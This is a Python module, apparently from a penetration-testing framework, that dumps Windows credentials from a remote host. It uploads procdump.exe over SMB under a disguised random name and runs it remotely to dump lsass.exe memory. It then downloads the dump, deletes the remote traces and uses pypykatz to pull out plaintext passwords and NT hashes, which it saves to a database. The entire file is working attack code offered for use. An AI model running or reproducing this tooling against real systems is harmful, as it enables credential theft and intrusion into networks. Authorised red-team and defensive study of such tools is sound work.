import re
import os
import io
from time import sleep
from argparse import Namespace
from pypykatz.pypykatz import pypykatz
from contextlib import redirect_stdout
from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper

from ar3.logger import setup_log_file
from ar3.ops.enum.host_enum import code_execution
from ar3.helpers.misc import get_filestamp, gen_random_string, get_local_ip

class ProcDump():
    def __init__(self):
        self.name           = 'procdump'
        self.description    = 'Uploads procdump.exe to system, captures lsass.exe, downloads & reads output locally using pypykatz'
        self.author         = ['@m8r0wn']
        self.requires_admin = True
        self.exec_methods   = ['wmiexec', 'smbexec']
        self.args = {}


    def run(self, target, args, smb_con, loggers, config_obj):
        # Setup vars
        self.logger     = loggers['console']
        self.loggers    = loggers
        self.config_obj = config_obj
        self.pd_binary  = os.path.join(os.path.expanduser('~'), '.ar3', 'scripts', 'procdump.exe')
        self.smb_con    = smb_con
        self.cmd_args       = args

        # Ability to change where tmp files located using cmd args
        self.ip     = '127.0.0.1'
        self.share  = args.exec_share
        self.path   = args.exec_path

        # Remote file paths
        self.binary_name  = gen_random_string() + ".txt"
        self.output_name  = gen_random_string() + ".dmp"

        # Local file paths
        self.local_binary = os.path.join(os.path.expanduser('~'), '.ar3', 'scripts', 'procdump.exe')
        self.file_name    = 'procdump_{}_{}.dmp'.format(target, get_filestamp())
        self.local_output = setup_log_file(args.workspace, self.file_name, ext='')

        try:
            self.procdump()
        except Exception as e:
            self.logger.fail([smb_con.host, smb_con.ip, self.name.upper(), e])
            return
        finally:
            try:
                self.logger.info([self.smb_con.host, self.smb_con.ip, self.name.upper(), "Deleting remote files"])
                self.smb_con.deleteFile(self.path + self.binary_name, self.share)
                self.smb_con.deleteFile(self.path + self.output_name, self.share)
            except:
                pass

        # Check for local dmp file, & parse
        if os.path.exists(self.local_output):
            if os.path.getsize(self.local_output) != 0:
                try:
                    self.logger.info([smb_con.host, smb_con.ip, self.name.upper(), "Parsing dump file: {}".format(self.file_name)])
                    self.parsedump(loggers, smb_con, self.local_output)
                except:
                    self.logger.fail([smb_con.host, smb_con.ip, self.name.upper(), "Error reading dump file: {}".format(self.file_name)])
            else:
                self.logger.fail([smb_con.host, smb_con.ip, self.name.upper(), "No data found, removing empty dmp file"])
                os.remove(self.local_output)
        else:
            self.logger.fail([smb_con.host, smb_con.ip, self.name.upper(), "Dmp file not found"])

    ##########################
    # Procdump logic
    ##########################
    def procdump(self):
        # Check local binary exists for upload:
        if not os.path.exists(self.local_binary):
            raise Exception("Local procdump executable not found, run \"ar3 enum --reload\"")

        # Upload procdump (if applicable)
        if self.upload_procdump():
            self.logger.info([self.smb_con.host, self.smb_con.ip, self.name.upper(),
                 "Uploaded procdump.exe to \\\\{}\\{}{}".format(self.ip, self.share, self.path + self.output_name)])
            if not self.verify_remoteFile(self.binary_name):
                raise Exception("Unable to verify procdump.exe in remote path, check system's AV settings")
        sleep(2)

        # Execute
        try:
            setattr(self.cmd_args, 'timeout', self.cmd_args.timeout + 25)
            exec_path     = "\\\\{}\\{}{}".format(self.ip, self.share, self.path + self.binary_name)
            remote_output = "\\\\{}\\{}{}".format(self.ip, self.share, self.path + self.output_name)
            cmd           = '{} -accepteula -ma lsass.exe {}'.format(exec_path, remote_output)

            self.logger.info([self.smb_con.host, self.smb_con.ip, self.name.upper(), "Executing remote dump of lsass.exe"])
            results = code_execution(self.smb_con, self.cmd_args, self.smb_con.ip, self.loggers, self.config_obj, cmd, return_data=True)
            for x in results.splitlines():
                if x:
                    self.logger.info([self.smb_con.host, self.smb_con.ip, self.name.upper(), x])

        except Exception as e:
            raise Exception("Procdump execution error: {}".format(str(e)))
        sleep(2)

        # Download output
        if self.verify_remoteFile(self.output_name):
            self.logger.info([self.smb_con.host, self.smb_con.ip, self.name.upper(), "Downloading remote output..."])
            self.smb_con.downloadFile(self.path+self.output_name, self.local_output, self.share)
        else:
            raise Exception("Unable to verify dmp in remote path, check system's AV settings")
        sleep(2)


    def upload_procdump(self,):
        try:
            self.smb_con.uploadFile(self.local_binary, self.path+self.binary_name, self.share)
            return True
        except Exception as e:
            raise Exception('Unable to upload procdump.exe: {}'.format(str(e)))


    def verify_remoteFile(self, filename):
        found = False
        for x in self.smb_con.list_path(self.share, self.path + "*"):
            try:
                 dir_file = x.get_longname().decode('UTF-8')
            except:
                dir_file = x.get_longname()
            if dir_file.lower() == filename.lower():
                return True
        return found


    ##########################
    # pypykatz dump parser
    ##########################
    def parsedump(self, loggers, smb_con, dumpfile):
        # Modified from:
          # https://github.com/awsmhacks/CrackMapExtreme/blob/a3a0ca13014b88dd2feb6db2ac522e2573321d6c/cmx/protocols/smb.py
          # & Inspiration by @HackAndDo aka Pixis for these parse bits
        arg = Namespace(outfile        = False,
                         json           = False,
                         grep           = False,
                         kerberos_dir   = False,
                         recursive      = False,
                         directory      = False)

        out = pypykatz.parse_minidump_file(dumpfile)

        f = io.StringIO()
        with redirect_stdout(f):  # Hides output
            LSACMDHelper().process_results({"dumpfile": out}, [], arg)

        logger = loggers['console']
        db_updates = 0
        for cred in self.parse_output(f.getvalue()):
            if cred['Password']:
                smb_con.db.update_user(cred['Username'], cred['Password'], cred['Domain'], '')
                logger.success([smb_con.host, smb_con.ip, self.name.upper(), "{}\\{}:{}".format(cred['Domain'], cred['Username'], cred['Password'])])
                db_updates += 1

            elif cred['Hash']:
                smb_con.db.update_user(cred['Username'], '', cred['Domain'], cred['Hash'])
                logger.success([smb_con.host, smb_con.ip, self.name.upper(), "{}\\{}:{}".format(cred['Domain'], cred['Username'], cred['Hash'])])
                db_updates += 1

        logger.info([smb_con.host, smb_con.ip, self.name.upper(), "{} credentials updated in database".format(db_updates)])
        logger.info([smb_con.host, smb_con.ip, self.name.upper(), "Dmp file saved to: {}".format(self.local_output)])


    def parse_output(self, output):
        regex = r"(?:username:? (?!NA)(?P<username>.+)\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
        credentials = []
        for match in matches:
            domain = match.group("domain")
            username = match.group("username")
            password = match.group("password")
            hashes   = match.group("hash")

            if password and len(password) < 128 or hashes and len(hashes) < 128: # Ignore kerberose
                credentials.append({'Domain'   : domain,
                                    'Username' : username,
                                    'Password' : password,
                                    'Hash'     : hashes})
        return credentials